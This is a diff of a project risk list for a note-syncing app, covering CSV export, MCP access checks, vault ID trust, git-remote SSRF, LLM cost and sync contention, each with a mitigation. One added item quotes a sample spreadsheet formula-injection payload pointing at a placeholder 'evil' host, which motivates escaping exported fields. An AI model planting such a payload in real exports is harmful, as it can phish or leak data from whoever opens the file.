+   2b. **CSV formula injection on export.** A task titled `=HYPERLINK("http://evil","Q4 plan")` exported to CSV becomes a live formula the moment it opens in Excel or Sheets — and board export is a feature you'd hand to other people. _Every exported field goes through `csvEscape()` from `lib/api/csv.ts`; a test asserts a leading `=`, `+`, `-` or `@` is neutralised._ Cheap to fix, invisible until someone gets phished by their own board.
+   6d. **MCP is a second front door to the same data.** Every isolation guarantee proven over HTTP has to hold over MCP too, and it's a path that's easy to forget when adding a capability. _`userId` comes from `auth.createdBy` (verified), never from a tool argument; `requireObsiddyUser` throws when it's absent; the isolation suite runs over both entry points._
+7. **Access-check omission on the 41st new endpoint.** _Owner-vs-shared repo split + eslint boundary + separate `/shared/*` surface, so the default new endpoint is owner-scoped and safe._
 8. **Email userId routing** — the one place the context-derived-userId invariant is bent. Without the sender check, anyone who learns the inbox address can inject thoughts into someone's brain.
-9. **`obsiddy-id` trust** — a vault file naming another user's row. *Always scope ID lookups by `userId`; never a bare `findUnique({where:{id}})` in the sync path.*
-10. **Git remote SSRF** — no DNS resolution in `checkSafeProviderUrl`, and git URLs are 100% user-supplied. *Host allowlist by default, DNS re-check, https-only, redirect re-check.*
-11. **Context-block bloat** — injected on every turn, grows with the user's data. *Cap ~1200 tokens, log the count.*
-12. **Background LLM cost** — the orchestrator recruits agents across 3 rounds. *`budgetLimitUsd` on the step and `maxCostPerExecutionUsd` on the workflow; watch `AiCostLog` for a fortnight.*
-13. **Maintenance-tick contention** — vault sync is the first genuinely slow, network-bound per-user task in a chain guarded by one boolean and a 5-minute watchdog. *Batch of 5, `SKIP LOCKED`, 60s budget, set `nextSyncAt` before working.*
+9. **`obsiddy-id` trust** — a vault file naming another user's row. _Always scope ID lookups by `userId`; never a bare `findUnique({where:{id}})` in the sync path._
+10. **Git remote SSRF** — no DNS resolution in `checkSafeProviderUrl`, and git URLs are 100% user-supplied. _Host allowlist by default, DNS re-check, https-only, redirect re-check._
+11. **Context-block bloat** — injected on every turn, grows with the user's data. _Cap ~1200 tokens, log the count._
+12. **Background LLM cost** — the orchestrator recruits agents across 3 rounds. _`budgetLimitUsd` on the step and `maxCostPerExecutionUsd` on the workflow; watch `AiCostLog` for a fortnight._
+13. **Maintenance-tick contention** — vault sync is the first genuinely slow, network-bound per-user task in a chain guarded by one boolean and a 5-minute watchdog. _Batch of 5, `SKIP LOCKED`, 60s budget, set `nextSyncAt` before working._
 14. **Production scheduling** — without external cron hitting the tick, all background intelligence silently never runs and it looks like the feature is broken.
 15. **Google Drive OAuth verification** — months of calendar risk, not code risk.
-16. **Obsidian Sync racing our sync** on the same folder. No technical fix — document it, and *detect* it (remote version changing between `list()` and `read()` → abort the run).
+16. **Obsidian Sync racing our sync** on the same folder. No technical fix — document it, and _detect_ it (remote version changing between `list()` and `read()` → abort the run).
